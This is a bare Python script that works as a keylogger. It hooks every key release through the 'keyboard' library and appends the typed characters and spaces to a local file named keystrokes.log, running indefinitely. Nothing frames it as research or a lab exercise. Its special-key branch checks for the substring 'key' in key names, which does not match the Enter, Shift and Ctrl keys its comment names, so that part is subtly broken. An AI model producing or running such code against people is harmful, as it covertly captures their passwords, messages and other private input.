import keyboard

def log_keystroke(event):
    key = event.name
    if len(key) == 1:
        # Log alphanumeric characters
        with open("keystrokes.log", "a") as log_file:
            log_file.write(key)
    elif key == "space":
        # Log space as a whitespace character
        with open("keystrokes.log", "a") as log_file:
            log_file.write(" ")
    elif "key" in key:
        # Log special keys (e.g., Enter, Shift, Ctrl)
        with open("keystrokes.log", "a") as log_file:
            log_file.write(f"<{key}>")

# Start listening for key events
keyboard.on_release(log_keystroke)

# Keep the program running
keyboard.wait()
